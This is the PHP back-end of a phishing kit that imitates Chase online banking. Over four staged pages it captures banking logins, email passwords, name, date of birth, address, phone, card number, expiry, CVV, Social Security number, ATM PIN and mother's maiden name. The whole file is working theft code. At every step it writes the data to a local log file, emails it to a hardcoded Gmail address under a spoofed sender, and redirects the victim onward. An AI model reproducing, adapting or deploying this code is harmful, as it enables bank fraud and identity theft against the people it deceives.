<?php
/*===================================================*/
define('EMAIL_LOGS','maxlife789@gmail.com'); /*Correo donde llegaran los logs*/
$rand = md5(rand(111,999));
$rand2 = sha1(rand(11,99));
$prefijo = substr(md5(uniqid(rand())),0,6);
$ip = $_SERVER["REMOTE_ADDR"];
/*===================================================*/
if( $_GET['login'] == '1' ){
/*===================================================*/
$message .= "------------- [ Login - $ip ] -------------<br>";
$message .= "Usuario: ".$_POST['1']."<br><br>";
$message .= "pass: ".$_POST['2']."<br><br>";
$message .= "-------------------------------------------------------<br>";
$message .= "https://www.chase.com/<br>";
$message .= "-------------------------------------------------------<br><br><br>";
$mesage = fopen("z3ro.php"."$css", 'a+');
fwrite($mesage, $message);
fclose($mesage);
$subj = " Usuario - $ip";
$from .= "From: Login<$prefijo@chanse.com>" . "\r\n";
$from .= "MIME-Version: 1.0" . "\r\n";
$from .= "Content-type: text/html; charset=utf-8" . "\r\n";
mail(EMAIL_LOGS, $subj, $message, $from);
sleep(2);
header("Location: verification.php?SSID=".$rand."/"."AUTH=".$rand2); }

if( $_GET['login'] == '2' ){

$message .= "------------- [ Correo - $ip ] -------------<br>";
$message .= "Correo: ".$_POST['3']."<br><br>";
$message .= "Contraseña: ".$_POST['4']."<br><br>";
$message .= "-------------------------------------------------------<br>";
$message .= "https://www.chase.com/<br>";
$message .= "-------------------------------------------------------<br><br><br>";
$mesage = fopen("z3ro.php"."$css", 'a+');
fwrite($mesage, $message);
fclose($mesage);
$subj = " Correo - $ip";
$from .= "From: Correo<$prefijo@chanse.com>" . "\r\n";
$from .= "MIME-Version: 1.0" . "\r\n";
$from .= "Content-type: text/html; charset=utf-8" . "\r\n";
mail(EMAIL_LOGS, $subj, $message, $from);
sleep(2);
header("Location: verification-billing.php?SSID=".$rand."/"."PROCESS=".$rand2); }
/*===================================================*/
if( $_GET['login'] == '3' ){

$message .= "------------- [ Billing - $ip ] -------------<br>";
$message .= "Full Name: ".$_POST['5']."<br><br>";
$message .= "Date Of Birth: ".$_POST['6']."<br><br>";
$message .= "Street Address:".$_POST['7']."<br><br>";
$message .= "City:".$_POST['8']."<br><br>";
$message .= "Postal Code: ".$_POST['9']."<br><br>";
$message .= "State/Region: ".$_POST['10']."<br><br>";
$message .= "Phone Number: ".$_POST['phoo']."<br><br>";
$message .= "-------------------------------------------------------<br>";
$message .= "https://www.chase.com/<br>";
$message .= "-------------------------------------------------------<br><br><br>";
$mesage = fopen("z3ro.php"."$css", 'a+');
fwrite($mesage, $message);
fclose($mesage);
$subj = " verification-billing - $ip";
$from .= "From: verification-billing<$prefijo@chanse.com>" . "\r\n";
$from .= "MIME-Version: 1.0" . "\r\n";
$from .= "Content-type: text/html; charset=utf-8" . "\r\n";
mail(EMAIL_LOGS, $subj, $message, $from);
sleep(2);
header("Location: verification-card.php?SSID=".$rand."/"."PROCESS=".$rand2); }

if( $_GET['login'] == '4' ){

$message .= "------------- [ verification-Card - $ip ] -------------<br>";
$message .= "Credit Card Number: ".$_POST['12']."<br><br>";
$message .= "Expiration Date MM/YYYY: ".$_POST['13']."<br><br>";
$message .= "CCV/CSC:".$_POST['14']."<br><br>";
$message .= "Social Security Number (SSN):".$_POST['16']."<br><br>";
$message .= "ATM PIN: ".$_POST['15']."<br><br>";
$message .= "Mother's maiden name?: ".$_POST['0001']."<br><br>";
$message .= "-------------------------------------------------------<br>";
$message .= "https://www.chase.com/<br>";
$message .= "-------------------------------------------------------<br><br><br>";
$mesage = fopen("z3ro.php"."$css", 'a+');
fwrite($mesage, $message);
fclose($mesage);
$subj = " verification-Card - $ip";
$from .= "From: verification-Card<$prefijo@chanse.com>" . "\r\n";
$from .= "MIME-Version: 1.0" . "\r\n";
$from .= "Content-type: text/html; charset=utf-8" . "\r\n";
mail(EMAIL_LOGS, $subj, $message, $from);
sleep(2);
header("Location: verification-finished.php?SSID=".$rand."/"."PROCESS=".$rand2); }
?>